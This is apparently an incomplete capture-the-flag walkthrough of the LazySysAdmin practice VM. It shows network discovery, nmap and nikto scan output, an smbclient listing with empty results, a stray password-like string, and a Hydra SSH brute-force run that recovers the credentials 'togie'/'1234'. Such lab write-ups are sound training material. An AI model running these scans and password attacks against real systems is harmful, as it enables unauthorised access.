# LazySysAdmin VM Walkthrough


Netdiscover result:

       Currently scanning: 192.168.48.0/16   |   Screen View: Unique Hosts           
                                                                                       
         3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 126               
         _____________________________________________________________________________
           IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
         -----------------------------------------------------------------------------
         192.168.42.129  9a:d1:53:35:56:b5      2      84  Unknown vendor              
         192.168.42.55   08:00:27:c1:be:89      1      42  PCS Systemtechnik GmbH 
         
Nmap results:         

        $sudo nmap -sS -sV -p- -A 192.168.42.55
        
        
        Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 18:16 IST
        Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
        Service scan Timing: About 83.33% done; ETC: 18:16 (0:00:02 remaining)
        Nmap scan report for 192.168.42.55
        Host is up (0.00045s latency).
        Not shown: 65529 closed tcp ports (reset)
        PORT     STATE SERVICE     VERSION
        22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   1024 b538660fa1eecd41693b82cfada1f713 (DSA)
        |   2048 585a6369d0dadd51ccc16e00fd7e61d0 (RSA)
        |   256 6130f3551a0ddec86a595bc99cb49204 (ECDSA)
        |_  256 1f65c0dd15e6e421f2c19ba3b655a045 (ED25519)
        80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
        |_http-server-header: Apache/2.4.7 (Ubuntu)
        |_http-title: Backnode
        | http-robots.txt: 4 disallowed entries 
        |_/old/ /test/ /TR2/ /Backnode_files/
        |_http-generator: Silex v2.2.7
        139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
        3306/tcp open  mysql       MySQL (unauthorized)
        6667/tcp open  irc         InspIRCd
        | irc-info: 
        |   server: Admin.local
        |   users: 1
        |   servers: 1
        |   chans: 0
        |   lusers: 1
        |   lservers: 0
        |   source ident: nmap
        |   source host: 192.168.42.230
        |_  error: Closing link: (nmap@192.168.42.230) [Client exited]
        MAC Address: 08:00:27:C1:BE:89 (Oracle VirtualBox virtual NIC)
        Device type: general purpose
        Running: Linux 3.X|4.X
        OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
        OS details: Linux 3.2 - 4.9
        Network Distance: 1 hop
        Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Host script results:
        | smb-os-discovery: 
        |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
        |   Computer name: lazysysadmin
        |   NetBIOS computer name: LAZYSYSADMIN\x00
        |   Domain name: \x00
        |   FQDN: lazysysadmin
        |_  System time: 2023-06-02T22:46:38+10:00
        |_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: 0s
        | smb2-security-mode: 
        |   311: 
        |_    Message signing enabled but not required
        |_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
        | smb-security-mode: 
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        | smb2-time: 
        |   date: 2023-06-02T12:46:38
        |_  start_date: N/A

        TRACEROUTE
        HOP RTT     ADDRESS
        1   0.45 ms 192.168.42.55

        OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
        
        
use the link to get some direct        
        
        http://192.168.42.55/robots.txt
        
        
        User-agent: *
        Disallow: /old/
        Disallow: /test/
        Disallow: /TR2/
        Disallow: /Backnode_files/       
Busting directories with nikto:

        
        $nikto -h http://192.168.42.55                                                             
        
        - Nikto v2.5.0
        ---------------------------------------------------------------------------
        + Target IP:          192.168.42.55
        + Target Hostname:    192.168.42.55
        + Target Port:        80
        + Start Time:         2023-06-02 18:28:05 (GMT5.5)
        ---------------------------------------------------------------------------
        + Server: Apache/2.4.7 (Ubuntu)
        + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
        + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
        + No CGI Directories found (use '-C all' to force check all possible dirs)
        + /test/: Directory indexing found.
        + /robots.txt: Entry '/test/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
        + /old/: Directory indexing found.
        + /robots.txt: Entry '/old/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
        + /Backnode_files/: Directory indexing found.
        + /robots.txt: Entry '/Backnode_files/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
        + /robots.txt: contains 4 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
        + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
        + /: Server may leak inodes via ETags, header found with file /, inode: 8ce8, size: 5560ea23d23c0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
        + OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
        + /apache/: Directory indexing found.
        + /apache/: This might be interesting.
        + /old/: This might be interesting.
        + /phpmyadmin/changelog.php: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22.
        + /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 0.
        + /test/: This might be interesting.
        + /info.php: Output from the phpinfo() function was found.
        + /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
        + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
        + /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
        + /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
        + /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
        + /wordpress/: Drupal Link header found with value: <http://192.168.42.55/wordpress/index.php?rest_route=/>; rel="https://api.w.org/". See: https://www.drupal.org/
        + /wordpress/: A Wordpress installation was found.
        + /phpmyadmin/: phpMyAdmin directory found.
        + /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
        + /wordpress/wp-login.php?action=register: Wordpress registration enabled.
        + /wordpress/wp-content/uploads/: Directory indexing found.
        + /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
        + /wordpress/wp-login.php: Wordpress login found.
        + 8258 requests: 0 error(s) and 32 item(s) reported on remote host
        + End Time:           2023-06-02 18:28:11 (GMT5.5) (6 seconds)
        ---------------------------------------------------------------------------
        + 1 host(s) tested
We could see smb is hosted in the vm by nmap scan

So we can try connecting to it with smbclient command:

         $smbclient -L 192.168.42.55
        
Results:







TogieMYSQL12345^^



        # hydra -l togie -P /usr/share/wordlists/rockyou.txt ssh://192.168.42.55/ -t 4
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-02 19:02:38
        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
        [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
        [DATA] attacking ssh://192.168.42.55:22/
        [22][ssh] host: 192.168.42.55   login: togie   password: 1234
